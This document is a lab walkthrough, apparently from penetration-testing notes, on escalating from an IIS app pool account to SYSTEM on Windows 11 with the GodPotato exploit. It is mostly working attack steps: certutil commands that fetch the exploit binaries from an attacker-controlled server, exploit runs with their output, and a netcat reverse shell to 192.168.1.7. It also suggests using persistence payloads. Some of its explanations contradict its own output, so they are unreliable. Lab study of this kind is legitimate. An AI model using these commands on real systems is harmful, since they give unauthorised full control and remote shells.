# GodPotato Exploit Lab - Windows Privilege Escalation

## Lab Environment: Windows PrivEsc - GodPotato

- Hostname: `PC3`

- OS: `Windows 11 IoT Enterprise LTSC (Build 26100)`

- Virtualization: VirtualBox (innotek GmbH)

- User Context: `iis apppool\defaultapppool`

- IP Address: `192.168.1.62`

- .NET Version: 4.8.1 (`Release 0x82348`)

- Patch Level: 5 Hotfixes (e.g. KB5049622, KB5052915)

### Security Notes

- VBS (Virtualization-Based Security): Not enabled

- Application Control for Business: Enforced

- Hypervisor: Detected

### User Context Check

- Run the following command to verify current user identity:

```cmd
whoami
````

> Output:

```bash
iis apppool\defaultapppool
```

```cmd
whoami /all
```

> Output:

```bash
USER INFORMATION
----------------

User Name                  SID
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

### Interpretation

> You're currently in the context of the IIS Default Application Pool account:

- This is a low-privileged built-in service account.

- Typically used by IIS to run web applications.

- Often encountered in web app exploitation scenarios after initial RCE access.

- Integrity level is medium unless sandboxed or restricted.


## Privilege Escalation Using GodPotato

- Use the GodPotato-NET4.exe binary to elevate to SYSTEM:

```cmd
C:\Users\Public\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

> Expected Output:

```text
nt authority\system
```

> You now have full SYSTEM-level privileges.


```cmd
GodPotato-NET35.exe -cmd "cmd /c nc64.exe -e cmd.exe 192.168.1.7 4433"
```

## GodPotato Overview

- Repository: [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

> GodPotato abuses a flaw in COM marshaling to bypass UAC and spawn a SYSTEM shell from a medium-integrity process. It hijacks a COM service and coerces it to run attacker-controlled commands.

### Requirements

- .NET Framework installed on target.

- Medium integrity context (e.g., web service accounts).

- The machine must not block COM hijacking via hardening measures or security policies.


## Download GodPotato Binaries

> Use `certutil.exe` to download the necessary binaries from an attacker-controlled HTTP server.

### Commands

```cmd
certutil.exe -urlcache -split -f "http://192.168.1.7/GodPotato-NET2.exe"   C:\Users\Public\GodPotato-NET2.exe
```

```cmd
certutil.exe -urlcache -split -f "http://192.168.1.7/GodPotato-NET35.exe"  C:\Users\Public\GodPotato-NET35.exe
```

```cmd
certutil.exe -urlcache -split -f "http://192.168.1.7/GodPotato-NET4.exe"   C:\Users\Public\GodPotato-NET4.exe
```

> Ensure your web server is running on `192.168.1.7:80`.


## Check Installed .NET Framework Version

- Before executing, confirm the .NET version to choose the correct payload binary.

### PowerShell Method

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -Recurse |
  Get-ItemProperty -Name Version -ErrorAction SilentlyContinue |
  Where-Object { $_.Version -match "^\d" } |
  Select-Object PSChildName, Version
```

### CMD Method

```cmd
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release
```

> Sample Output:

```text
Release    REG_DWORD    0x82348
```

- Hex `0x82348` = Decimal `533000` →  .NET Framework 4.8.1


> Use the binary version matching your .NET installation (e.g., `GodPotato-NET4.exe` for .NET 4.8+).

## Execute Exploit

- Once the correct binary is downloaded, launch the exploit with a chosen command:

```cmd
C:\Users\Public\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

> Expected Output:

```text
nt authority\system
```

> Replace `whoami` with other useful commands such as reverse shells, PowerShell downloaders, or persistence payloads.

## Key Notes

- Tested on: Windows 11 IoT Enterprise LTSC Build 26100

- Initial Context: `iis apppool\defaultapppool`

- Use the correct binary: `NET2`, `NET35`, or `NET4`

- Escalates to: `NT AUTHORITY\SYSTEM`

- No need for UAC bypass or service restarts

- Ensure Defender or App Control doesn't block binary execution

## Related
- [Impersonation and Potato Attacks](Impersonation-and-Potato-Attacks.md) — parent hub
- [Juicy Potato](Juicy-Potato.md) — predecessor potato exploit
- [JuicyPotatoNG](JuicyPotatoNG.md) — modernized variant
- [Token Impersonation](Token-Impersonation.md) — SeImpersonate abuse the potatoes rely on
- [Windows Privilege Escalation](../README.md) — escalation context
